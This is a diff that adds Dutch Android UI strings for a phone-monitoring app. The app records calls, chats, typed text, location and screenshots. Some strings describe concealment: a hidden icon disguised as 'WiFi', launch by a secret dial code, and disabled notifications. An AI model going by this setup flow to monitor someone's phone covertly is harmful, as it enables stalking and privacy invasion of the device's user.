@@ -1,0 +1,335 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="abc_action_bar_home_description">Navigeren naar startpositie</string>
+    <string name="abc_action_bar_up_description">Omhoog navigeren</string>
+    <string name="abc_action_menu_overflow_description">Meer opties</string>
+    <string name="abc_action_mode_done">Gereed</string>
+    <string name="abc_activity_chooser_view_see_all">Alles weergeven</string>
+    <string name="abc_activitychooserview_choose_application">Een app selecteren</string>
+    <string name="abc_capital_off">UIT</string>
+    <string name="abc_capital_on">AAN</string>
+    <string name="abc_menu_alt_shortcut_label">Alt +</string>
+    <string name="abc_menu_ctrl_shortcut_label">Ctrl +</string>
+    <string name="abc_menu_delete_shortcut_label">verwijderen</string>
+    <string name="abc_menu_enter_shortcut_label">enter</string>
+    <string name="abc_menu_function_shortcut_label">Functie +</string>
+    <string name="abc_menu_meta_shortcut_label">Meta +</string>
+    <string name="abc_menu_shift_shortcut_label">Shift +</string>
+    <string name="abc_menu_space_shortcut_label">spatie</string>
+    <string name="abc_menu_sym_shortcut_label">Sym +</string>
+    <string name="abc_prepend_shortcut_label">Menu +</string>
+    <string name="abc_search_hint">Zoeken…</string>
+    <string name="abc_searchview_description_clear">Zoekopdracht wissen</string>
+    <string name="abc_searchview_description_query">Zoekopdracht</string>
+    <string name="abc_searchview_description_search">Zoeken</string>
+    <string name="abc_searchview_description_submit">Zoekopdracht verzenden</string>
+    <string name="abc_searchview_description_voice">Gesproken zoekopdracht</string>
+    <string name="abc_shareactionprovider_share_with">Delen met</string>
+    <string name="abc_shareactionprovider_share_with_application">Delen met %s</string>
+    <string name="abc_toolbar_collapse_description">Samenvouwen</string>
+    <string name="app_log_name">Apps</string>
+    <string name="check">Verwijder hier de oude versie</string>
+    <string name="dialog_allow_unknown_source">Geef toestemming voor \"Onbekende apps installeren\" om de app bij te werken.</string>
+    <string name="dialog_battery_optim">Schakel Optimaliseer batterijgebruik uit om de app correct te laten werken.</string>
+    <string name="dialog_battery_optim_on">Optimalisatie van het batterijgebruik is nog steeds ingeschakeld!</string>
+    <string name="dialog_battery_optim_set">":
+ - Wijzig \"Niet geoptimaliseerd\" tot \"Alle apps\" item
+ - Zoek en shakel de \"%1$s\" app uit
+ - Tik op de \"Terug-knop\""</string>
+    <string name="dialog_no">Nee</string>
+    <string name="dialog_ok">OK</string>
+    <string name="dialog_perm_accessibility">Gelieve de app toegankelijkheidsservice in te schakelen</string>
+    <string name="dialog_perm_accessibility_on">App toegangkelijkheidsservice is nog steeds uitgeschakeld!</string>
+    <string name="dialog_perm_app">"Activeer alle toegangsrechten voor de app:
+ - Open \"Toestemming\" item
+ - Activeer alle toestemmingen"</string>
+    <string name="dialog_perm_app_off">Sommige app toestemmingen zijn nog steeds uitgeschakeld!</string>
+    <string name="dialog_perm_notif">Gelieve de app notificaties uit te schakelen</string>
+    <string name="dialog_perm_notif_on">App notificaties zijn nog steeds ingeschakeld!</string>
+    <string name="dialog_perm_overlay">Activeer de \"Bovenop verschijnen\" toestemming om Screenshots en Ontgrendel Selfies te krijgen.</string>
+    <string name="dialog_perm_overlay_off">\"Bovenop verschijnen\" toestemming is nog steeds uitgeschakeld!</string>
+    <string name="dialog_perm_read_notif">Geef %1$s toestemming om meldingen te lezen</string>
+    <string name="dialog_perm_read_notif_off">Toegang tot leesmeldingen is nog steeds uitgeschakeld!</string>
+    <string name="dialog_perm_scr">"Laat %1$s toe om scherm op te nemen om screenshots te maken:
+ - Activeer \"Niet meer tonen\" item
+ - Tik op de knop \"Nu beginnen\""</string>
+    <string name="dialog_perm_scr_off">Schermopname is nog steeds uitgeschakeld!</string>
+    <string name="dialog_perm_usage">"Activeer \"Gebruiksgegevens toegang\" toestemming om screenshots te krijgen:
+ - Zoek en tik op \"%1$s\" app
+ - Gebruikstoegang inschakelen
+ - Tik twee keer op de \"Terug-knop\""</string>
+    <string name="dialog_perm_usage_off">\"Gebruiksgegevens toegang\" toestemming is nog steeds uitgeschakeld!</string>
+    <string name="dialog_pin_current">Huidige PIN</string>
+    <string name="dialog_pin_retype">Herhaal PIN</string>
+    <string name="dialog_pin_specify">Nieuwe PIN</string>
+    <string name="dialog_run_app">Om de verborgen app te openen bel naar:</string>
+    <string name="dialog_run_app_sticker">Om de verborgen app te openen gebruik de \"Sticker\" widget</string>
+    <string name="dialog_uninstall_ask">Wilt u Monitor verwijderen?</string>
+    <string name="dialog_update">Update</string>
+    <string name="dialog_wait">Wacht a.u.b.…</string>
+    <string name="dialog_yes">Ja</string>
+    <string name="email_msg_alarm">Abonnement vervalt na %1$s.</string>
+    <string name="email_msg_alarm_renew">"
+Gelieve uw abonnement te verlengen."</string>
+    <string name="email_msg_alarm_stop">Abonnement is verlopen.</string>
+    <string name="email_msg_alarm_stop_logs">Betaalde rapporten worden weggegooid tenzij u een abonnement start.</string>
+    <string name="event_count">Tel</string>
+    <string name="event_name">Evenement</string>
+    <string name="general_password">Voer uw PIN in</string>
+    <string name="global_settings_name">Instellingen</string>
+    <string name="gm_now">Nu</string>
+    <string name="hint_change_pin_new">Nieuwe PIN invoeren</string>
+    <string name="hint_enter_pin">Voer PIN in</string>
+    <string name="hint_sms_hiden">[Verborgen]</string>
+    <string name="ignore">Sla deze stap over</string>
+    <string name="im_log_name">IM</string>
+    <string name="inst_accessibility_activate_action">ZET DE DIENST AAN</string>
+    <string name="inst_accessibility_browsers_list">Chrome, Opera, Firefox, Samsung, Mint, ASUS</string>
+    <string name="inst_accessibility_caption">Selecteer Extra Activiteiten om te Monitoren</string>
+    <string name="inst_accessibility_chats">Chatberichten</string>
+    <string name="inst_accessibility_chats_list">WhatsApp, Facebook Messenger, Viber, Hangouts</string>
+    <string name="inst_accessibility_hint">"Om toegang te hebben tot de inhoud van het scherm moet u de toegangsservice activeren:
+Kies '%1$s' app in de lijst en schakel het in. Ga terug naar deze pagina. (Het systeem kan de app op dit moment sluiten)"</string>
+    <string name="inst_accessibility_sites">Website geschiedenis</string>
+    <string name="inst_call_recording">Opnames van telefoongesprekken</string>
+    <string name="inst_chat_recording">Opnames van chatgesprekken</string>
+    <string name="inst_chose_device_type">Kies a.u.b. het type apparaat</string>
+    <string name="inst_enable_location_access">"Toepassing vereist toegang tot locatie:\\n\\n1. Zoek en tik op de instelling \\'Machtigingen\\'.\\n2. Zoek en tik op de instelling \\'Locatie\\'.\\n3. Inschakelen: \\'Altijd toestaan\\'"</string>
+    <string name="inst_finish_action">Afwerking van de installatie</string>
+    <string name="inst_finish_caption">Configuratie voltooid</string>
+    <string name="inst_finish_hint">"Installatie voltooid!
+Zie de logs in uw account."</string>
+    <string name="inst_hello_cancel">Installatie Annuleren</string>
+    <string name="inst_hello_caption">Dit Apparaat Laten Gemonitord Worden</string>
+    <string name="inst_hello_hint">Als u van plan bent dit apparaat te monitoren, dan moet u alle configuratiestappen doorlopen. Zorg ervoor dat u een geregistreerd account heeft en druk op VOLGENDE.</string>
+    <string name="inst_license_caption">Licentieovereenkomst Voor Eindgebruikers</string>
+    <string name="inst_log_select_all">Alle activiteiten</string>
+    <string name="inst_log_select_apps">Apps</string>
+    <string name="inst_log_select_calendar">Kalender</string>
+    <string name="inst_log_select_calls">Gesprekslogs</string>
+    <string name="inst_log_select_caption">Apparaat Activiteiten om te Volgen</string>
+    <string name="inst_log_select_contacts">Contacten</string>
+    <string name="inst_log_select_gallery">Galerij</string>
+    <string name="inst_log_select_hint">Als je sommige opties niet aanvinkt, kun je ze niet op afstand aanzetten. Je zou fysieke toegang tot een apparaat nodig hebben.</string>
+    <string name="inst_log_select_location">Locatie</string>
+    <string name="inst_log_select_sms">SMS/MMS</string>
+    <string name="inst_log_select_system">Systeemgebeurtenissen</string>
+    <string name="inst_log_select_system_hint">(SIM, batterij, netwerk info)</string>
+    <string name="inst_log_select_unlock">Ontgrendel fotos</string>
+    <string name="inst_log_typed_text">Getypte tekst</string>
+    <string name="inst_login_activate">Activeer</string>
+    <string name="inst_login_caption">Voer uw gegevens in</string>
+    <string name="inst_login_forgot_password">Wachtwoord vergeten?</string>
+    <string name="inst_login_hint_email">Voer e-mail in</string>
+    <string name="inst_login_hint_password">Voer wachtwoord in</string>
+    <string name="inst_old_version_found">Verwijder de volgende oude versie(s) om mogelijke fouten te voorkomen:</string>
+    <string name="inst_pin_caption">Stel Uw PIN In</string>
+    <string name="inst_pin_change">Wijzig PIN</string>
+    <string name="inst_pin_change_hint">PIN</string>
+    <string name="inst_pin_change_icon">Android beperkt het verbergen van app-pictogrammen. De app verschijnt op een apparaat onder het pictogram \"WiFi\".</string>
+    <string name="inst_pin_hide_app">Verberg applicatie-icoon</string>
+    <string name="inst_pin_hint">Applicatie kan worden gestart door ***%1$s### te bellen</string>
+    <string name="inst_pin_turn_on">Bescherm applicatie met PIN</string>
+    <string name="inst_rec_warning">Het is mogelijk dat gesprekken niet correct opgenomen worden op sommige modellen van Android-telefoons</string>
+    <string name="inst_requiremens_a11y">Toegankelijkheidsservice</string>
+    <string name="inst_requiremens_a11y_hint">Toegankelijkheidsservice is nodig om uitgebreide monitorfuncties te kunnen bieden.</string>
+    <string name="inst_requiremens_a11y_instruction">"1. Tik op Geïnstalleerde (gedownloade) diensten.
+ 2. Tik op '%1$s'.
+ 3. Zet de knop aan en tik op Toestaan.
+ 4. Tik op de systeem TERUG-knop totdat u terugkeert naar deze pagina."</string>
+    <string name="inst_requiremens_a11y_instruction_14">"
+
+ Als de activering van de service is geblokkeerd, opent u Instellingen>Apps>'%1$s', zoekt u naar \"Beperkte instellingen toestaan\" en schakelt u deze in. Als het niet in de instellingen staat, klik dan op de 3 stippen in de rechterbovenhoek, schakel het vervolgens in en herhaal vervolgens de service-activatie."</string>
+    <string name="inst_requiremens_a11y_instruction_header">Om de toegangkelijkheidsservice te activeren:</string>
+    <string name="inst_requiremens_basic">Basistoestemmingen</string>
+    <string name="inst_requiremens_basic_hint">Applicatie vereist toegang tot opslag, telefooninstellingen, gesprekslogs en contacten.</string>
+    <string name="inst_requiremens_basic_instruction">"1. Zoek en tik op de instelling 'Toestemmingen'.
+
+2. Inschakelen:
+\u0009- Contacten
+\u0009- Telefoon
+\u0009- Opslag
+
+3. Tik op de systeem TERUG-knop totdat u terugkeert naar deze pagina."</string>
+    <string name="inst_requiremens_basic_instruction_26">"1. Zoek en tik op de instelling 'Toestemmingen'.
+
+2. Inschakelen:
+\u0009- Gesprekslogs
+\u0009- Contacten
+\u0009- Telefoon
+\u0009- Opslag
+
+3. Tik op de systeem TERUG-knop totdat u terugkeert naar deze pagina."</string>
+    <string name="inst_requiremens_basic_instruction_header">Om toestemmingen toe te staan:</string>
+    <string name="inst_requiremens_battery">Optimalisatie van de Batterij Uitschakelen</string>
+    <string name="inst_requiremens_battery_hint">Laat de app altijd in de achtergrond draaien (Batterij-optimalisatie UIT) om te voorkomen dat de app stopt vanwege de besparing van de batterij.</string>
+    <string name="inst_requiremens_caption">Applicatievereisten</string>
+    <string name="inst_requiremens_everything_ready">Bijna klaar! Nog maar een aantal stappen!</string>
+    <string name="inst_requiremens_files_access_header">Toegang tot opslag toestaan:</string>
+    <string name="inst_requiremens_files_access_instruction">1. Blader door de lijst totdat je de toepassing <b>"'%1$s'"</b>" ziet.
+
+2. "<b>Zet de schakelaar</b>" aan om toestemming te verlenen.
+
+3. Tik op de "<b>TERUG</b>-knop van het systeem totdat u terugkeert naar deze pagina.</string>
+    <string name="inst_requiremens_hint">Activeer alle genoemde opties zodat de applicatie goed kan functioneeren</string>
+    <string name="inst_requiremens_notifications">App Notificaties Uitschakelen</string>
+    <string name="inst_requiremens_notifications_access">Toegang tot meldingen</string>
+    <string name="inst_requiremens_notifications_access_hint">Met deze toestemming kunnen meldingen worden gelezen.</string>
+    <string name="inst_requiremens_notifications_access_instruction">1. Blader door de lijst totdat u de toepassing <b>"'%1$s'"</b>" ziet. 
+
+2. "<b>Zet de schakelaar aan</b>" om toestemming te verlenen. 
+
+3. "<b>Tik op</b> <b>Toestaan</b>". 
+
+4. Tik op de "<b>TERUG</b>-knop van het systeem totdat u terugkeert naar deze pagina.</string>
+    <string name="inst_requiremens_notifications_access_instruction_header">Toegang tot meldingen toestaan:</string>
+    <string name="inst_requiremens_notifications_hint">Notificaties van deze applicatie moeten worden AF gezet, omdat ze mogelijk te vervelend zijn.</string>
+    <string name="inst_requiremens_notifications_instruction">"1. Zoek en tik op de 'Notificatie-instelling'.
+
+2. Schakel de hoofdknop "<b>UIT</b>".
+
+3. Tik op de systeem "<b>TERUG-knop</b> totdat u terugkeert naar deze pagina.</string>
+    <string name="inst_requiremens_notifications_instruction_26">"1. Schakel de instelling 'Notificaties weergeven' "<b>UIT</b>".
+
+2. Tik op de systeem "<b>TERUG-knop</b> om terug te keeren naar deze pagina.</string>
+    <string name="inst_requiremens_notifications_instruction_header">Om notificaties van deze app uit te schakelen:</string>
+    <string name="inst_requiremens_overlay">Overlap Toestemming</string>
+    <string name="inst_requiremens_overlay_hint">De applicatie moet bovenop andere apps kunnen worden weergegeven.</string>
+    <string name="inst_requiremens_usage">Toegang tot Gebruik</string>
+    <string name="inst_requiremens_usage_hint">Deze toestemming maakt het mogelijk om de activiteit van andere applicaties te monitoren.</string>
+    <string name="inst_requiremens_usage_instruction">1. Scroll door de lijst tot je <b>"'%1$s'"</b>" applicatie ziet.
+
+2. "<b>Tik op</b>" de applicatie.
+
+3. "<b>Zet de knop aan</b>" om toestemming te geven.
+
+4. Tik op de systeem "<b>TERUG-knop</b> totdat u terugkeert naar deze pagina.</string>
+    <string name="inst_requiremens_usage_instruction_header">Om toegang tot het gebruik toe te staan:</string>
+    <string name="inst_screenshots_caption">Welke Soorten Screenshots Zou Je Willen Opnemen?</string>
+    <string name="inst_screenshots_hint">"U moet de app toestaan om screenshots te maken zonder toekomstige bevestigingen. Stel het selectievakje 'Niet meer tonen' in in het toestemmingsvragend dialoogvenster en druk op de START NU knop.."</string>
+    <string name="inst_screenshots_im">van Instant Messengers</string>
+    <string name="inst_screenshots_sms">van SMS/MMS</string>
+    <string name="inst_screenshots_timer">Getimed, van Huidige Activiteit</string>
+    <string name="inst_screenshots_title">Screenshots:</string>
+    <string name="inst_screenshots_web">van Webbrowsers</string>
+    <string name="inst_type_caption">Gelieve te bevestigen dat deze applicatie correct zal worden gebruikt</string>
+    <string name="inst_type_confirmation">Ik bevestig dat de gebruiker van dit apparaat op de hoogte is van de monitoringsoftware en ik heb hun expliciete toestemming</string>
+    <string name="inst_type_employee">Een werknemersapparaat</string>
+    <string name="inst_type_intention">Ik ga deze software gebruiken om te monitoren:</string>
+    <string name="inst_type_kids">Het apparaat van mijn kind</string>
+    <string name="inst_type_own">Mijn eigen apparaat</string>
+    <string name="license_accept">Ik accepteer</string>
+    <string name="license_read">Ik heb de voorwaarden gelezen en begrepen</string>
+    <string name="license_text"><b>1.</b>" U bent zich ervan bewust dat deze software informatie over het gebruik van het apparaat en de gebruikersactiviteit kan opnemen, opslaan en verzenden. 
+ 
+"<b>2.</b>" U mag deze software alleen gebruiken onder de volgende voorwaarden: 
+U gebruikt deze software op een apparaat dat u bezit en persoonlijk gebruikt; 
+U hebt uitdrukkelijke schriftelijke toestemming van de eigenaar en alle gebruikers van het apparaat dat gemonitord wordt; 
+U bent een wettelijke voogd van de gebruiker van het apparaat dat gemonitord wordt; 
+ 
+"<b>3.</b> U kent en voldoet aan de wet- en regelgeving met betrekking tot privacy, vertrouwelijkheid en het gebruik van dergelijke monitoringsoftware in uw rechtsgebied. U neemt de volledige verantwoordelijkheid voor de installatie of het gebruik van de software. Programmeurs, verkopers of distributeurs van de software kunnen niet aansprakelijk worden gesteld voor eventuele juridische overtredingen of gevolgen die voortvloeien uit het installeren of gebruiken van de software.</string>
+    <string name="log_files_name">Galerij</string>
+    <string name="log_name_audio">Audio</string>
+    <string name="log_name_file">Bestand</string>
+    <string name="log_name_gif">Gif</string>
+    <string name="log_name_image">Afbeelding</string>
+    <string name="log_name_sticker">Sticker</string>
+    <string name="log_name_video">Video</string>
+    <string name="menu_change_email">E-mailinstellingen wijzigen</string>
+    <string name="menu_change_pin">Wijzig de PIN van de app</string>
+    <string name="menu_check_app_state">App toestemmingen checken</string>
+    <string name="menu_check_update">Checken voor updates</string>
+    <string name="menu_clear">Wis lokale logs</string>
+    <string name="menu_close">Sluit</string>
+    <string name="menu_disable_pin_protection">PIN-bescherming uitschakelen</string>
+    <string name="menu_enable_pin_protection">PIN-bescherming inschakelen</string>
+    <string name="menu_hide_icon">Verberg %1$s icoon</string>
+    <string name="menu_reset_app_perm">App-machtigingen opnieuw instellen</string>
+    <string name="menu_reset_license">Licentie resetten</string>
+    <string name="menu_select_source">Wijzig de audiobron</string>
+    <string name="menu_show_icon">Toon %1$s icoon</string>
+    <string name="menu_uninstall">Verwijder</string>
+    <string name="module_calendar">Kalendergebeurtenissen</string>
+    <string name="module_calls">Oproepen</string>
+    <string name="module_contacts">Contacten</string>
+    <string name="module_files">Bestanden</string>
+    <string name="module_location">Locatie</string>
+    <string name="module_mms">MMS</string>
+    <string name="module_photo">Ontgrendel Selfies</string>
+    <string name="module_screen_shot">Screenshots</string>
+    <string name="module_sim">SIM-kaart veranderen</string>
+    <string name="module_sms">SMS</string>
+    <string name="module_web">Bezochte websites</string>
+    <string name="next">volgende</string>
+    <string name="search_menu_title">Zoeken</string>
+    <string name="skype_call">BELLEN</string>
+    <string name="skype_call_cancel">Sluiten</string>
+    <string name="skype_call_conn">VERBINDEN</string>
+    <string name="skype_call_end">Gesprek beëindigen</string>
+    <string name="skype_start">"Audiobericht afspelen, "</string>
+    <string name="skype_stop">Audiobericht onderbreken</string>
+    <string name="status_Version">App versie:</string>
+    <string name="status_activated">Activering</string>
+    <string name="status_bar_notification_info_overflow">999+</string>
+    <string name="status_internet_connection">Geen internetverbinding</string>
+    <string name="status_last_send">Laatste data upload:</string>
+    <string name="status_last_sync">Laatste verbinding:</string>
+    <string name="status_memory_usage">Geheugengebruik</string>
+    <string name="status_monitor_disabled">Monitor uitgeschakeld</string>
+    <string name="status_monitor_enabled">Monitor ingeschakeld</string>
+    <string name="status_record">Opnemen</string>
+    <string name="status_send_data_period">Data upload periode</string>
+    <string name="status_server_connected">Aangesloten</string>
+    <string name="status_valid">geldig door</string>
+    <string name="status_wifi">Alleen Wi-Fi</string>
+    <string name="telegram_date_format_full">d MMM yyyy</string>
+    <string name="telegram_date_format_short">d MMM</string>
+    <string name="telegram_got">Ontvangen om</string>
+    <string name="telegram_got_ans1">Heeft</string>
+    <string name="telegram_got_ans2">reacties</string>
+    <string name="telegram_loaded">gedownload</string>
+    <string name="telegram_pause">Pauzeren</string>
+    <string name="telegram_sending">Versturen</string>
+    <string name="telegram_sent">Gestuurd om</string>
+    <string name="telegram_video">Video</string>
+    <string name="telegram_viewed">keer bekeken</string>
+    <string name="telegram_voice">Spraakbericht</string>
+    <string name="text_log_name">Getypte tekst</string>
+    <string name="time_day">d.</string>
+    <string name="time_hrs">u.</string>
+    <string name="time_min">m.</string>
+    <string name="time_sec">s.</string>
+    <string name="title_activity_installer">Installatieprogramma</string>
+    <string name="toast_digit_pin">PIN mag alleen cijfers bevatten</string>
+    <string name="toast_empty_email">Voer account e-mail in</string>
+    <string name="toast_empty_password">Voer account passwoord in</string>
+    <string name="toast_empty_pin">Voer app PIN in</string>
+    <string name="toast_error_activation">Activeringsfout</string>
+    <string name="toast_hide_icon">%1$s icoon zal verborgen zijn na het sluiten van de app.</string>
+    <string name="toast_length_pin">PIN mag slechts 4 cijfers bevatten</string>
+    <string name="toast_license_limit">licentie fout.</string>
+    <string name="toast_license_locked">licentie vergrendeld.</string>
+    <string name="toast_logs_cleared">Lokale logs succesvol gewist</string>
+    <string name="toast_no_inet">Gelieve de internetverbinding te controleeren</string>
+    <string name="toast_not_same_pin">PIN-codes komen niet overeen</string>
+    <string name="toast_pin_changed">PIN succesvol gewijzigd</string>
+    <string name="toast_reset_app_perms">Beide machtigingen zijn al uitgeschakeld</string>
+    <string name="toast_server_not_available">Server is niet beschikbaar. Controleer de internetverbinding of probeer het later opnieuw.</string>
+    <string name="toast_show_icon">%1$s icoon zal zichtbaar zijn na het sluiten van de app.</string>
+    <string name="toast_unkn_err">onbekende fout:</string>
+    <string name="toast_wrong_account_or_password">Verkeerd account e-mail of wachtwoord.</string>
+    <string name="toast_wrong_pin">Incorrecte PIN</string>
+    <string name="update_current_version">Huidige versie: %1$s</string>
+    <string name="update_new_version">Nieuwe versie: %1$s</string>
+    <string name="update_status_error_disable_link">Update link is niet beschikbaar. Probeer het later nog eens.</string>
+    <string name="update_status_error_disable_server">De server is niet beschikbaar. Controleer uw internetverbinding</string>
+    <string name="update_status_error_download">Fout bij het laden van updates</string>
+    <string name="update_status_ok_check_link">Verifiëren van de update link</string>
+    <string name="update_status_ok_check_server">Verifiëren van de toegang tot de server.</string>
+    <string name="update_status_ok_download_update">Downloaden van updates…</string>
+    <string name="update_status_ok_install">Installeren van updates…</string>
+    <string name="viber_change">Bewerken</string>
+    <string name="widget_enter_note">Tekst invoeren</string>
+    <string name="widget_hint">Tik op om tekst in te voeren</string>
+    <string name="widget_name">Sticker</string>
+</resources>
